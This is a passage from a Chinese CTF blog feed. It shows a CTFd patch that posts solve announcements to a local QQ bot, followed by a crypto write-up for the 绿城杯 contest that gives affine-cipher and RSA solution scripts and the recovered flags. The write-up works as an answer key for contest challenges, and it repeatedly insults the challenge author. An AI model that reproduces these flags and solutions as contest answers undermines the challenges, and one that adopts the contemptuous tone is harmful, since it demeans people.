class="number">404</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> status:  <span class="comment"># The challenge plugin says the input is right</span></span><br><span class="line">                <span class="keyword">if</span> ctftime() <span class="keyword">or</span> current_user.is_admin():</span><br><span class="line">                    chal_class.solve(</span><br><span class="line">                        user=user, team=team, challenge=challenge, request=request</span><br><span class="line">                    )</span><br><span class="line">                    clear_standings()</span><br><span class="line"></span><br><span class="line">                log(</span><br><span class="line">                    <span class="string">&quot;submissions&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;[&#123;date&#125;] &#123;name&#125; submitted &#123;submission&#125; on &#123;challenge_id&#125; with kpm &#123;kpm&#125; [CORRECT]&quot;</span>,</span><br><span class="line">                    submission=request_data[<span class="string">&quot;submission&quot;</span>].encode(<span class="string">&quot;utf-8&quot;</span>),</span><br><span class="line">                    challenge_id=challenge_id,</span><br><span class="line">                    kpm=kpm,</span><br><span class="line">                )</span><br><span class="line">                <span class="comment">#从这里开始加</span></span><br><span class="line">                <span class="comment"># auto-broadcast</span></span><br><span class="line"></span><br><span class="line">                solve_count = Solves.query.filter_by(challenge_id=challenge_id).count()</span><br><span class="line">                blood_number = <span class="string">&quot;&quot;</span></span><br><span class="line">                <span class="keyword">if</span> solve_count == <span class="number">1</span>:</span><br><span class="line">                    blood_number = <span class="string">&quot;一血&quot;</span></span><br><span class="line">                <span class="keyword">elif</span> solve_count == <span class="number">2</span>:</span><br><span class="line">                    blood_number = <span class="string">&quot;二血&quot;</span></span><br><span class="line">                <span class="keyword">elif</span> solve_count == <span class="number">3</span>:</span><br><span class="line">                    blood_number = <span class="string">&quot;三血&quot;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">                <span class="keyword">if</span> blood_number:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;是三血&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(challenge_category)  <span class="comment"># 题目分类</span></span><br><span class="line">                    <span class="built_in">print</span>(challenge_name)  <span class="comment"># 题目名称</span></span><br><span class="line">                    <span class="built_in">print</span>(user_name)</span><br><span class="line">                    <span class="built_in">print</span>(blood_number)</span><br><span class="line">                    <span class="keyword">import</span> requests</span><br><span class="line">                    url = <span class="string">&quot;http://127.0.0.1:5700/send_group_msg?group_id=xxxxx&amp;message=&quot;</span></span><br><span class="line">                    msg=<span class="string">&quot;恭喜&lt;&#123;&#125;&gt;获得[&#123;&#125;]类型题目《&#123;&#125;》 &#123;&#125;! Tql&quot;</span>.<span class="built_in">format</span>(user_name,challenge_category, challenge_name,blood_number)</span><br><span class="line">                    url=url+msg</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        requests.get(url=url)</span><br><span class="line">                    <span class="keyword">except</span>:</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;不是三血&quot;</span>)</span><br><span class="line">                    <span class="keyword">import</span> requests</span><br><span class="line">                    url = <span class="string">&quot;http://127.0.0.1:5700/send_group_msg?group_id=xxxxx&amp;message=&quot;</span></span><br><span class="line">                   </span><br><span class="line">                  </span><br><span class="line">                    msg=<span class="string">&quot;恭喜&lt;&#123;&#125;&gt;解出[&#123;&#125;]类型题目《&#123;&#125;》Tql&quot;</span>.<span class="built_in">format</span>(user_name,challenge_category, challenge_name)</span><br><span class="line">                    url=url+msg</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&#x27;不是三血开始推送&#x27;</span>)</span><br><span class="line">                        requests.get(url=url)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&#x27;不是三血推送成功&#x27;</span>)</span><br><span class="line">                    <span class="keyword">except</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&#x27;不是三血推送失败&#x27;</span>)</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">                <span class="comment">#到这结束    </span></span><br><span class="line">                <span class="keyword">return</span> &#123;</span><br><span class="line">                    <span class="string">&quot;success&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">                    <span class="string">&quot;data&quot;</span>: &#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;correct&quot;</span>, <span class="string">&quot;message&quot;</span>: message&#125;,</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">else</span>:  <span class="comment"># The challenge plugin says the input is wrong</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>bot</tag>
      </tags>
  </entry>
  <entry>
    <title>服务器取证</title>
    <url>/2021/10/15/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 密码不对呢，为什么不去社工管理员呢？" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="433bfaaaf01d949dff177fb50ca1c8739afcd7b8ea1116adb21a725ea78e5474"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好,接下来的内容需要密码才能阅览。</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>电子取证</category>
      </categories>
      <tags>
        <tag>服务器取证</tag>
      </tags>
  </entry>
  <entry>
    <title>绿城杯密码</title>
    <url>/2021/10/06/%E7%BB%BF%E5%9F%8E%E6%9D%AF%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<h1 id="绿城杯密码题"><a href="#绿城杯密码题" class="headerlink" title="绿城杯密码题"></a>绿城杯密码题</h1><p>出题人是真的垃圾，出的这么简单，被全国的师傅打了不知道多少种解。不会出题可以不出，出这种垃圾题简直是在侮辱做题师傅们的智商。</p>
<span id="more"></span>
<h2 id="warmup-50"><a href="#warmup-50" class="headerlink" title="warmup(50)"></a>warmup(50)</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>密码签到题，给了以下脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>]==<span class="string">'flag{'</span></span><br><span class="line"></span><br><span class="line">str1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">plain_text, a, b, m</span>):</span></span><br><span class="line">	cipher_text = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> plain_text:</span><br><span class="line">		<span class="keyword">if</span> i <span class="keyword">in</span> str1:</span><br><span class="line">			addr = str1.find(i)</span><br><span class="line">			cipher_text += str1[(a*addr+b) % m]</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			cipher_text += i</span><br><span class="line">	<span class="built_in">print</span>(cipher_text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">encode(flag,<span class="number">37</span>,<span class="number">23</span>,<span class="number">52</span>)</span><br><span class="line"><span class="comment"># cipher_text = 'aoxL{XaaHKP_tHgwpc_hN_ToXnnht}'</span></span><br></pre></td></tr></table></figure>
<h3 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h3><p>就一个，一眼就能根据加密算法看出来这是affline cipher。</p>
<p>没什么好多说的，加解密函数</p>
<script type="math/tex; mode=display">
E\left( x \right) \,\,=\,\,\left( ax+b \right) \,\,mod\,\,m
\\
D\left( x \right) \,\,=\,\,a^{-1}\left( x-b \right) \,\,mod\,\,m</script><p>求个逆元完事。</p>
<h3 id="解法一（预期解）"><a href="#解法一（预期解）" class="headerlink" title="解法一（预期解）"></a>解法一（预期解）</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">cipher_text = <span class="string">'aoxL{XaaHKP_tHgwpc_hN_ToXnnht}'</span></span><br><span class="line">str1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">affline_decode</span>(<span class="params">cipher_text, a, b, m</span>):</span></span><br><span class="line">	plain_text = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> cipher_text:</span><br><span class="line">		<span class="keyword">if</span> i <span class="keyword">in</span> str1:</span><br><span class="line">			addr = str1.find(i)</span><br><span class="line">			plain_text += str1[(addr-b) * inverse(a,m) % m]</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			plain_text += i</span><br><span class="line">	<span class="built_in">print</span>(plain_text)</span><br><span class="line"></span><br><span class="line">affline_decode(cipher_text,<span class="number">37</span>,<span class="number">23</span>,<span class="number">52</span>)</span><br><span class="line"><span class="comment">#flag{AffInE_CIpheR_iS_clAssiC}</span></span><br></pre></td></tr></table></figure>
<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>放进在线工具的仿射密码里，直接能求出flag原文。然后根据加密算法，爆破一下大小写。也是一种不错的解法。这道题和一般的仿射密码的唯一区别在于，一般仿射密码的字母为26个，不区分大小写。而这道题加了大小写的考点，最后肯定是要用到脚本的。</p>
<h2 id="RSA-1"><a href="#RSA-1" class="headerlink" title="RSA-1"></a>RSA-1</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>]==<span class="string">b'flag{'</span></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'n ='</span>,n)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">M = <span class="number">2021</span> * m * <span class="number">1001</span> * p </span><br><span class="line">c = <span class="built_in">pow</span>(M,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'c ='</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="comment">#n = 17365231154926348364478276872558492775911760603002394353723603461898405740234715001820111548600914907617003806652492391686710256274156677887101997175692277729648456087534987616743724646598234466094779540729413583826355145277980479040157075453694250572316638348121571218759769533738721506811175866990851972838466307594226293836934116659685215775643285465895317755892754473332034234495795936183610569571016400535362762699517686781602302045048532131426035260878979892169441059467623523060569285570577199236309888155833013721997933960457784653262076135561769838704166810384309655788983073376941843467117256002645962737847</span></span><br><span class="line"><span class="comment">#c = 6944967108815437735428941286784119403138319713455732155925055928646536962597672941805831312130689338014913452081296400272862710447207265099750401657828165836013122848656839100854719965188680097375491193249127725599660383746827031803066026497989298856420216250206035068180963797454792151191071433645946245914916732637007117085199442894495667455544517483404006536607121480678688000420422281380539368519807162175099763891988648117937777951069899975260190018995834904541447562718307433906592021226666885638877020304005614450763081337082838608414756162253825697420493509914578546951634127502393647068722995363753321912676</span></span><br></pre></td></tr></table></figure>
<h3 id="考点-1"><a href="#考点-1" class="headerlink" title="考点"></a>考点</h3><p>考了个小同余的性质。</p>
<script type="math/tex; mode=display">
\text{如果} a\,\,\equiv \,\,b\,\,\left( mod\,\,m \right) \,\,
\\
\text{则有} \left( a,m \right) \,\,=\,\,\left( b,m \right)</script><p>证明过程不写了，比较简单。</p>
<h3 id="解法一（预期解）-1"><a href="#解法一（预期解）-1" class="headerlink" title="解法一（预期解）"></a>解法一（预期解）</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">17365231154926348364478276872558492775911760603002394353723603461898405740234715001820111548600914907617003806652492391686710256274156677887101997175692277729648456087534987616743724646598234466094779540729413583826355145277980479040157075453694250572316638348121571218759769533738721506811175866990851972838466307594226293836934116659685215775643285465895317755892754473332034234495795936183610569571016400535362762699517686781602302045048532131426035260878979892169441059467623523060569285570577199236309888155833013721997933960457784653262076135561769838704166810384309655788983073376941843467117256002645962737847</span></span><br><span class="line">c = <span class="number">6944967108815437735428941286784119403138319713455732155925055928646536962597672941805831312130689338014913452081296400272862710447207265099750401657828165836013122848656839100854719965188680097375491193249127725599660383746827031803066026497989298856420216250206035068180963797454792151191071433645946245914916732637007117085199442894495667455544517483404006536607121480678688000420422281380539368519807162175099763891988648117937777951069899975260190018995834904541447562718307433906592021226666885638877020304005614450763081337082838608414756162253825697420493509914578546951634127502393647068722995363753321912676</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = gmpy2.gcd(c,n)</span><br><span class="line">q = n//p</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = inverse(e,phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)//<span class="number">1001</span>//p//<span class="number">2021</span>))</span><br><span class="line"><span class="comment">#b'flag{Math_1s_1nterest1ng_hah}'</span></span><br></pre></td></tr></table></figure>
<h3 id="解法二-1"><a href="#解法二-1" class="headerlink" title="解法二"></a>解法二</h3><p>rsatools里面竟然有函数能判断<code>n</code>和<code>c</code>是否有相同因子，属实给我蚌埠住了。大意了，没想到还有用工具做RSA的。放进去直接出<code>d</code>了，然后有<code>d</code>和<code>n</code>能求出<code>p</code>和<code>q</code>，答案就出了。</p>
<p>用工具做密码是没有灵魂的。</p>
<h2 id="RSA-2"><a href="#RSA-2" class="headerlink" title="RSA-2"></a>RSA-2</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>]==<span class="string">b'flag{'</span></span><br><span class="line"></span><br><span class="line">m1 = bytes_to_long(flag[:<span class="number">20</span>])</span><br><span class="line">p  = getPrime(<span class="number">512</span>)</span><br><span class="line">p1 = gmpy2.next_prime(p)</span><br><span class="line">q  = getPrime(<span class="number">512</span>)</span><br><span class="line">q1 = gmpy2.next_prime(q)</span><br><span class="line">n1 = p*q*p1*q1</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'n1 ='</span>,n1)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c1 = <span class="built_in">pow</span>(m1,e,n1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'c1 ='</span>,c1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m2 = bytes_to_long(flag[<span class="number">20</span>:])</span><br><span class="line">p2 = getPrime(<span class="number">1024</span>)</span><br><span class="line">q2 = getPrime(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'p2+q2 ='</span>,p2+q2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'p2*q2 ='</span>,p2*q2)</span><br><span class="line">n2 = p2*p2*q2*q2*q2</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'n2 ='</span>,n2)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m2,e,n2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'c2 ='</span>,c2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#n1 = 6348779979606280884589422188738902470575876294643492831465947360363568026280963989291591157710389629216109615274754718329987990551836115660879103234129921943824061416396264358110216047994331119920503431491509529604742468032906950984256964560405062345280120526771439940278606226153077959057882262745273394986607004406770035459301695806378598890589432538916219821477777021460189140081521779103226953544426441823244765828342973086422949017937701261348963541035128661464068769033772390320426795044617751909787914185985911277628404632533530390761257251552073493697518547350246993679844132297414094727147161169548160586911</span></span><br><span class="line"><span class="comment">#c1 = 6201882078995455673376327652982610102807874783073703018551044780440620679217833227711395689114659144506630609087600915116940111002026241056808189658969089532597757995423694966667948250438579639890580690392400661711864264184444018345499567505424672090632235109624193289954785503512742400960515331371813467034511130432319427185134018830006918682733848618201088649690422818940385123599468595766345668931882249779415788129316594083269412221804774856038796248038700275509397599351533280014908894068141056694660319816046357462684688942519849441237878018480036145051967731081582598773076490918572392784684372694103015244826</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p2+q2 = 274773146761138462708137582309097386437793891793691383033856524303010811294101933454824485010521468914846151819876043508541879637544444256520741418495479393777132830985856522008561088410862815913292288683761657919121930016956916865849261153721097671315883469348972925757078089715102032241818526925988645578778</span></span><br><span class="line"><span class="comment">#p2*q2 = 18514724270030962172566965941723224386374076294232652258701085781018776172843355920566035157331579524980108190739141959926523082142273672741849552475156278397131571360099018592018959785627785130126477982765210498547680367230723634424036009539347854344573537848628061468892166199866227984167843139793429682559241317072979374002912607549039431398267184818771503468116379618249319324788996321340764624593443106354104274472601170229835219638093242557547840060892527576940077162990069687019966946826210112318408269749294366586682732614372434218768720577917368726530200897558912687470088583774711767599580037663378929000217</span></span><br><span class="line"><span class="comment">#n2 = 40588227045595304080360385041082238507044292731344465815296032905633525556943787610712651675460810768762763493579129831271018141591546207557410817432455139315527674932933085299277599173971912445226532235814580879585317211349524406424200622675880992390782025158621241499693400288031658194434641718026910652327933253877313106112861283314274635124734817398465059373562194694957841264834312640926278890386089611103714990646541470577351599526904458342660444968591197606820361364761648205241041444681145820799054413179462285509661124362074093583494932706249461954240408827087015525507173082129412234486228092002841868365895837463699200959915782767657258729794037776401995309244941171415842403617486719492483671490834562579225506831496881542530519595438932482796867853234159664409420977526102480385193101883785161080269573707156626838551506024455480650224305894501968583442346807126920740779780593650871645915149689424292912611578291912721896864772950410266629045542480009266574096080138709683466489568290569363478444349563498507530805502511051165160827192795520182720802422213364247355775222858214648603034743679187470844212529134374975737510982287957316878179964602394749601431823167982157434890459245394370728942790117156485268116758052636794417268680901420193002289035538753620555488506926366624641291881353268617130968991258983002165300186971963661666476600998389048880565199317280428349802824448329898502788492233381873026217202981921654673840142095839603360666049476100561268336225902504932800605464136192275593886736746497955270280541423593</span></span><br><span class="line"><span class="comment">#c2 = 25591090168544821761746024178724660839590948190451329227481168576490717242294520739865602061082558759751196452117720647426598261568572440942370039702932821941366792140173428488344932203576334292648255551171274828821657097667106792872200082579319963310503721435500623146012954474613150848083425126987554594651797477741828655238243550266972216752593788734836373144363217639612492397228808215205862281278774096317615918854403992620720969173788151215489908812749179861803144937169587452008097008940710091361183942268245271154461872102813602754439939747566507116519362821255724179093051041994730856401493996771276172343313045755916751082693149885922105491818225012844519264933137622929024918619477538521533548551789739698933067212305578480416163609137189891797209277557411169643568540392303036719952140554435338851671440952865151077383220305295001632816442144022437763089133141886924265774247290306669825085862351732336395617276100374237159580759999593028756939354840677333467281632435767033150052439262501059299035212928041546259933118564251119588970009016873855478556588250138969938599988198494567241172399453741709840486953189764289118312870580993115636710724139809708256360212728127786394411676427828431569046279687481368215137561500777480380501551616577832499521295655237360184159889151837766353116185320317774645294201044772828099074917077896631909654671612557207653830344897644115936322128351494551004652981550758791285434809816872381900401440743578104582305215488888563166054568802145921399726673752722820646807494657299104190123945675647</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="考点："><a href="#考点：" class="headerlink" title="考点："></a>考点：</h3><p>第一段</p>
<script type="math/tex; mode=display">
n\,\,=\,\,p\,\,* q\,\,* nextprime\left( p \right) \,\,* nextprime\left( q \right)</script><p>费马分解。</p>
<p>第二段解个方程（实际出了个离谱非预期，根本不用解，但是没有战队想到），然后欧拉函数。</p>
<h3 id="解法："><a href="#解法：" class="headerlink" title="解法："></a>解法：</h3><p>这垃圾出题人刷没刷过题啊，祥云杯2020的原题都好意思拿来出。</p>
<p>祥云杯脚本走一下就行。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n1 = <span class="number">6348779979606280884589422188738902470575876294643492831465947360363568026280963989291591157710389629216109615274754718329987990551836115660879103234129921943824061416396264358110216047994331119920503431491509529604742468032906950984256964560405062345280120526771439940278606226153077959057882262745273394986607004406770035459301695806378598890589432538916219821477777021460189140081521779103226953544426441823244765828342973086422949017937701261348963541035128661464068769033772390320426795044617751909787914185985911277628404632533530390761257251552073493697518547350246993679844132297414094727147161169548160586911</span></span><br><span class="line">c1 = <span class="number">6201882078995455673376327652982610102807874783073703018551044780440620679217833227711395689114659144506630609087600915116940111002026241056808189658969089532597757995423694966667948250438579639890580690392400661711864264184444018345499567505424672090632235109624193289954785503512742400960515331371813467034511130432319427185134018830006918682733848618201088649690422818940385123599468595766345668931882249779415788129316594083269412221804774856038796248038700275509397599351533280014908894068141056694660319816046357462684688942519849441237878018480036145051967731081582598773076490918572392784684372694103015244826</span></span><br><span class="line"></span><br><span class="line">jia = <span class="number">274773146761138462708137582309097386437793891793691383033856524303010811294101933454824485010521468914846151819876043508541879637544444256520741418495479393777132830985856522008561088410862815913292288683761657919121930016956916865849261153721097671315883469348972925757078089715102032241818526925988645578778</span></span><br><span class="line">cheng = <span class="number">18514724270030962172566965941723224386374076294232652258701085781018776172843355920566035157331579524980108190739141959926523082142273672741849552475156278397131571360099018592018959785627785130126477982765210498547680367230723634424036009539347854344573537848628061468892166199866227984167843139793429682559241317072979374002912607549039431398267184818771503468116379618249319324788996321340764624593443106354104274472601170229835219638093242557547840060892527576940077162990069687019966946826210112318408269749294366586682732614372434218768720577917368726530200897558912687470088583774711767599580037663378929000217</span></span><br><span class="line">n2 = <span class="number">40588227045595304080360385041082238507044292731344465815296032905633525556943787610712651675460810768762763493579129831271018141591546207557410817432455139315527674932933085299277599173971912445226532235814580879585317211349524406424200622675880992390782025158621241499693400288031658194434641718026910652327933253877313106112861283314274635124734817398465059373562194694957841264834312640926278890386089611103714990646541470577351599526904458342660444968591197606820361364761648205241041444681145820799054413179462285509661124362074093583494932706249461954240408827087015525507173082129412234486228092002841868365895837463699200959915782767657258729794037776401995309244941171415842403617486719492483671490834562579225506831496881542530519595438932482796867853234159664409420977526102480385193101883785161080269573707156626838551506024455480650224305894501968583442346807126920740779780593650871645915149689424292912611578291912721896864772950410266629045542480009266574096080138709683466489568290569363478444349563498507530805502511051165160827192795520182720802422213364247355775222858214648603034743679187470844212529134374975737510982287957316878179964602394749601431823167982157434890459245394370728942790117156485268116758052636794417268680901420193002289035538753620555488506926366624641291881353268617130968991258983002165300186971963661666476600998389048880565199317280428349802824448329898502788492233381873026217202981921654673840142095839603360666049476100561268336225902504932800605464136192275593886736746497955270280541423593</span></span><br><span class="line">c2 = <span class="number">25591090168544821761746024178724660839590948190451329227481168576490717242294520739865602061082558759751196452117720647426598261568572440942370039702932821941366792140173428488344932203576334292648255551171274828821657097667106792872200082579319963310503721435500623146012954474613150848083425126987554594651797477741828655238243550266972216752593788734836373144363217639612492397228808215205862281278774096317615918854403992620720969173788151215489908812749179861803144937169587452008097008940710091361183942268245271154461872102813602754439939747566507116519362821255724179093051041994730856401493996771276172343313045755916751082693149885922105491818225012844519264933137622929024918619477538521533548551789739698933067212305578480416163609137189891797209277557411169643568540392303036719952140554435338851671440952865151077383220305295001632816442144022437763089133141886924265774247290306669825085862351732336395617276100374237159580759999593028756939354840677333467281632435767033150052439262501059299035212928041546259933118564251119588970009016873855478556588250138969938599988198494567241172399453741709840486953189764289118312870580993115636710724139809708256360212728127786394411676427828431569046279687481368215137561500777480380501551616577832499521295655237360184159889151837766353116185320317774645294201044772828099074917077896631909654671612557207653830344897644115936322128351494551004652981550758791285434809816872381900401440743578104582305215488888563166054568802145921399726673752722820646807494657299104190123945675647</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">s=Solver()</span><br><span class="line">x=Int(<span class="string">'x'</span>)</span><br><span class="line">y=Int(<span class="string">'y'</span>)</span><br><span class="line">s.add(x+y==jia)</span><br><span class="line">s.add(x*y==cheng)</span><br><span class="line"><span class="keyword">assert</span> s.check()==sat</span><br><span class="line"></span><br><span class="line">p2=<span class="built_in">int</span>(<span class="built_in">str</span>(s.model()[x]))</span><br><span class="line">q2=<span class="built_in">int</span>(<span class="built_in">str</span>(s.model()[y]))</span><br><span class="line"></span><br><span class="line">phi = n2 * (p2-<span class="number">1</span>) * (q2-<span class="number">1</span>) // (p2 * q2)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">m2=long_to_bytes(<span class="built_in">pow</span>(c2,d,n2))</span><br><span class="line"><span class="built_in">print</span>(m2)</span><br><span class="line"></span><br><span class="line">phi1=p2-<span class="number">1</span></span><br><span class="line">d = inverse(e,phi1)</span><br><span class="line">m = <span class="built_in">pow</span>(c2, d, p2)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fermat_factorization</span>(<span class="params">n</span>):</span></span><br><span class="line">	factor_list = []</span><br><span class="line">	get_context().precision = <span class="number">1024</span></span><br><span class="line">	x = <span class="built_in">int</span>(sqrt(n))</span><br><span class="line">	<span class="comment">#print(x)</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		x += <span class="number">1</span></span><br><span class="line">		y2 = x ** <span class="number">2</span> - n</span><br><span class="line">		<span class="keyword">if</span> is_square(y2):</span><br><span class="line">			<span class="comment">#print('x = ',x)</span></span><br><span class="line">			y2 = mpz(y2)</span><br><span class="line">			get_context().precision = <span class="number">1024</span></span><br><span class="line">			y = <span class="built_in">int</span>(sqrt(y2))</span><br><span class="line">			factor_list.append([x+y, x-y])</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(factor_list) == <span class="number">2</span>:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">return</span> factor_list</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">* 复制并使用代码请注明引用出处哦~</span><br><span class="line">* Lazzaro @ https://lazzzaro.github.io</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">tmp1=(fermat_factorization(n1)[<span class="number">0</span>])[<span class="number">0</span>]</span><br><span class="line">tmp2=(fermat_factorization(n1)[<span class="number">0</span>])[<span class="number">1</span>]</span><br><span class="line">tmp3=(fermat_factorization(n1)[<span class="number">1</span>])[<span class="number">0</span>]    <span class="comment">#p1*q1</span></span><br><span class="line">tmp4=(fermat_factorization(n1)[<span class="number">1</span>])[<span class="number">1</span>]    <span class="comment">#p*q</span></span><br><span class="line"></span><br><span class="line">p=gcd(tmp1,tmp4)</span><br><span class="line">q=gcd(tmp2,tmp4)</span><br><span class="line">p1=next_prime(p)</span><br><span class="line">q1=next_prime(q)</span><br><span class="line">phi1=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(p1-<span class="number">1</span>)*(q1-<span class="number">1</span>)</span><br><span class="line">d1=inverse(<span class="number">65537</span>,phi1)</span><br><span class="line">m1=long_to_bytes(<span class="built_in">pow</span>(c1,d1,n1))</span><br><span class="line"><span class="built_in">print</span>(m1)</span><br><span class="line"><span class="built_in">print</span>(m1+m2)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>解方程有很多种解法，z3，sagemath，求根公式，当然也可以不解方程。</p>
<script type="math/tex; mode=display">
n\,\,=\,\,p^2\,\,*\,q^3
\\
p*q\,\,=\,\,c
\\
q\,\,=\,\,n\,\,\div \,\,\left( p^2q^2 \right)</script><p>看得出来出题人确实没学好除法。</p>
<p>费马分解后，4个值为<code>p*q</code>、<code>p1*q</code>、<code>p*q1</code>、<code>p1*q1</code>，显然，4个数最大的为<code>p1*q1</code>，最小的为<code>p*q</code>，那和剩下的两个数求个公因数就出来了。</p>
<p>欧拉函数不多解释了，放两个。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">phi = p-<span class="number">1</span></span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,p)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">phi = (p-<span class="number">1</span>) * p * (q-<span class="number">1</span>) * q * q</span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>建议出题人好好学习数学，不要不自量力去给全国性的比赛出题。</p>
]]></content>
      <categories>
        <category>crypto</category>
      </categories>
